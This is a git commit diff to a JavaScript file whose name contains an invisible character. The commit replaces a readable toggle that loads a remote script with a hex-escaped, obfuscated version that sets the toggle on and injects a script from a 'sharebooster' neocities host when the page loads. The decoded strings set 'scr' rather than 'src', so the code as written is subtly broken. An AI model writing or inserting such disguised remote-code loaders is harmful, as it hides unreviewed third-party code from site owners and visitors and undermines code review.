d7993253c68e2bf99618d9927b4eeef7524dd251
Puyit321 <jkingpuyit@gmail.com>
2025-04-14 10:50:45 +0800

    Update encryptedㅤ.js

--- encryptedㅤ.js
+++ encryptedㅤ.js
@@ -1,14 +1,14 @@
-// Toggle to enable or disable the external script
-var loadExternalScript = false; // Set to false to disable the script
+var loadExternalScript = true;
 
-var statusDiv = document.getElementById('scriptStatus');
-
-if (loadExternalScript) {
-    // Load the external JavaScript file
-    var script = document.createElement('script');
-    script.src = 'https://sharebooster.neocities.org/script%E3%85%A4.js'; // Path to your JavaScript file
-    document.head.appendChild(script);
-} else {
-    statusDiv.style.display = 'block';
-    statusDiv.textContent = "Server is under repair please wait...";
-}
+(function(){
+    var _0x5a1f=["\x73\x74\x79\x6C\x65","\x64\x69\x73\x70\x6C\x61\x79","\x6E\x6F\x6E\x65","\x74\x65\x78\x74\x43\x6F\x6E\x74\x65\x6E\x74","\x53\x63\x72\x69\x70\x74\x20\x69\x73\x20\x64\x69\x73\x61\x62\x6C\x65\x64","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x73\x63\x72","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x73\x68\x61\x72\x65\x62\x6F\x6F\x73\x74\x65\x72\x2E\x6E\x65\x6F\x63\x69\x74\x69\x65\x73\x2E\x6F\x72\x67\x2F\x73\x63\x72\x69\x70\x74\xE3\x85\xA4\x2E\x6A\x73","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x68\x65\x61\x64","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64"];
+    if(!loadExternalScript){
+        var el=document[_0x5a1f[10]]("scriptStatus");
+        el[_0x5a1f[0]][_0x5a1f[1]]=_0x5a1f[2];
+        el[_0x5a1f[3]]=_0x5a1f[4];
+    }else{
+        var s=document[_0x5a1f[5]]("script");
+        s[_0x5a1f[6]]=_0x5a1f[7];
+        document[_0x5a1f[9]][_0x5a1f[8]](s);
+    }
+})();
